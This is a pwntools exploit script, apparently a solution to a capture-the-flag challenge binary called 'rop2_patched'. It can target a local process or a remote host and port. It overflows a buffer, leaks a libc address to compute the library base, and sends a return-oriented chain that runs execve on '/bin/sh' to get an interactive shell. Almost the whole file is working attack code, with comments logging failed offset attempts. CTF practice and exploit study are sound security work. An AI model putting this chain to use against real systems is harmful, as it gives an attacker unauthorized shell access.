#!/usr/bin/env python
# Generated by ropper ropchain generator #

from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./rop2_patched")
    if args.GDB:
        gdb.attach(r,'b *0x8048320')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
padding = b"A" * 16
overflow = 0x08048454
syscall_plt = 0x8048320
r.sendafter(b'Give me your ropchain:',b'A' * 8 + b'//bin/sh' + p32(overflow) +  b'//bin/sh\x00' * 30)
res = r.recv(0x400)
leak = u32(res[0x188:0x188 + 4])
# leak = u32(res[0x13c:0x13c + 4])
print("libc leak: " + str(hex(leak)))
libc = leak - 0xf7ef9540 + 0xf7d3d000
print("libc: " + str(hex(libc)))
# Stack spray to get bin sh -> offset always goes wrong
# bin sh in Libc -> local and remote has different loading address 
# leak =0xffe48ae1 sh=0xffe46e84+0x8
# stack = 0xff8e8000
# leak = 0xff908ae1
# 0x20ae1

# Leak 0xffeaaae1
# Stack 0xffe8a000
# 0x20ae1

# Leak 0xff996ae1
# Stack 0xff976000
# 0x20ae1

# stack = leak - 0x20ae1
sh = libc + 0x15ba3f
print("sh: " + str(hex(sh)))
r.sendline(b'//bin/sh' * 2 + p32(syscall_plt) + p32(0xDEADBEEF) + p32(0xb) + p32(sh) + p32(0x804a018) + p32(0x804a018))
r.interactive()


